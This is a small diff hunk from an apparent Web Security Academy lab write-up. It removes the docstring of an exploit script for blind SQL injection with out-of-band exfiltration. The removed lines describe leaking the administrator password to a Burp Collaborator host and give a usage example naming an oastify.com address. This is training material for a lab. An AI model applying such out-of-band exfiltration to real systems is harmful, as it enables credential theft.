@@ -33,20 +33,6 @@ python3 exploit.py https://<your-lab-id>.web-security-academy.net
 ### Exploit
 
 ```python title="exploit.py"
-#!/usr/bin/env python3
-"""
-oob_sqli_exfil.py
-
-Exploit Blind SQL Injection with Out-of-Band (OOB) data exfiltration.
-This leaks the administrator password in a DNS/HTTP request to Burp Collaborator.
-
-Usage:
-    python oob_sqli_exfil.py <url> <collaborator-subdomain>
-
-Example:
-    python oob_sqli_exfil.py https://target.lab pa3gw5qad0jn77hef0jikr54vv1mpdd2.oastify.com
-"""
-
 import sys
 import requests
 import urllib3
